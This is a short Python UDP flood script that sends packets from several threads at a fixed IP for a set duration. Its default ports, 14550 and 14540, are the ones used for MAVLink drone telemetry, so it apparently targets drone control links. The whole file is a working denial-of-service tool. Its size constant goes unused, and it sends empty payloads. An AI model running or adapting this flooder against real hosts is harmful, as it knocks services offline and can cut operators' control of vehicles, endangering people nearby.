import socket
import threading
import sys
import time

# Optimized payload size for standard Ethernet MTU
MAX_UDP_PAYLOAD = 1472 

def flood_worker(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b""
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, port))
        except Exception:
            pass

def udp_flood(ip="192.168.13.14", port=14550, threads=1, duration=60, execution_record=None):
    if execution_record:
        execution_record["arguments"] = {
            "ip": ip,
            "port": port,
            "threads": threads,
            "duration": duration
        }
    print(f"Starting udp flood on {ip}:{port} with {threads} threads...")
    stop_event = threading.Event()
    thread_list = []
    
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(ip, port, stop_event))
        t.daemon = True
        t.start()
        thread_list.append(t)

    time.sleep(duration)
    stop_event.set()
    for t in thread_list:
        t.join(timeout=1)
    print("\nStopping flood.")

if __name__ == "__main__":
    # if len(sys.argv) < 3:
    #     print("Usage: python udp_flood_optimized.py <ip> <port> [threads]")
    #     sys.exit(1)
    
    # target_ip = sys.argv[1]
    # target_port = int(sys.argv[2])
    # num_threads = int(sys.argv[3]) if len(sys.argv) > 3 else 4
    # udp_flood(target_ip, target_port, num_threads)
    udp_flood("192.168.13.14", 14540)
